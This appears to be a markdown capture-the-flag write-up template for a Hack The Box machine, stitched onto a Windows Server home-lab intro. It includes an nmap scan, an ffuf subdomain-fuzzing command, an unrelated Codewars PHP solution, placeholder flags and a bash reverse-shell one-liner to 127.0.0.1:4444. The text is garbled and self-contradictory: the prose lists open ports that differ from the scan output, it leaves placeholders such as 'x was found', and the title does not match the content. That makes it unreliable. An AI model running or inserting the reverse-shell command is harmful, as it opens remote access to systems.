**Title**: "Home Lab Setup"

**Author**: Tarell King

**Tools Used**: [Windows server, AD (Active Directory), xx ]

## Table of Contents
1. [Introduction](#Intro)
4. [Conclusion](#conclusion)
5. [References](#references)

## Intro
##  Setting up virtual enviorment  **Prerequsites Virtaul box or another virtualization software, windows server iso**

We begin by installig windows server in a virtual machine. 

Create a Windows 10 Virtal machine and assign the windows server iso in the storage devices.

![image](https://github.com/TarellKing/Home-Lab/assets/121117376/4f3948b9-315c-4803-a6ef-cad8ed72a8cb)





```console

┌──(tarell㉿kali)-[~]
└─$ sudo nmap -sV 10.10.11.11

Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-22 22:42 EDT
Nmap scan report for 10.10.11.11
Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
```

#Enumeration

```console

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
```

From the above output we can see that ports, 22, 53, and 81 are the ports open. 



# Fuzzing  

Perform a sub-domain/vhost fuzzing scan on ‘*.board.htb’ using the provided IP address. To achieve this, use a wordlist of common subdomains. This wordlist will try each entry as a subdomain for ‘board.htb’. Here is the command:
```console

ffuf -w Desktop/wordlist.txt -u http://board.htb/ -H "host:FUZZ.board.htb" -H "Content-Type: application/x-www-form-urlencoded" -fs 15949 -c 

```
after fuzzing we can see that x was found 



























```php
function sqInRect($lng, $wdth) {

    if($lng == $wdth) {
      return null;
    }

    $squares = array();

    while($lng*$wdth >= 1) {
      if($lng>$wdth) {
        $base = $wdth;
        $lng = $lng - $base;
      }
      else {
        $base = $lng;
        $wdth = $wdth - $base;
      }
      array_push($squares, $base);
    }
    return $squares;
}
```
Above is the php code for the **Rectangle into Squares** kata solution from codewars.


## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.


![Root](./images/root.png)
\ **Figure 3:** root.txt v5gw5zkh8rr3vmye7p4ka


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.

# References
1. [https://ryankozak.com/how-i-do-my-ctf-writeups/](https://ryankozak.com/how-i-do-my-ctf-writeups/)
2. [https://github.com/Wandmalfarbe/pandoc-latex-template](https://github.com/Wandmalfarbe/pandoc-latex-template)
3. [https://hackthebox.eu](https://hackthebox.eu)
4. [https://forum.hackthebox.eu](https://forum.hackthebox.eu)
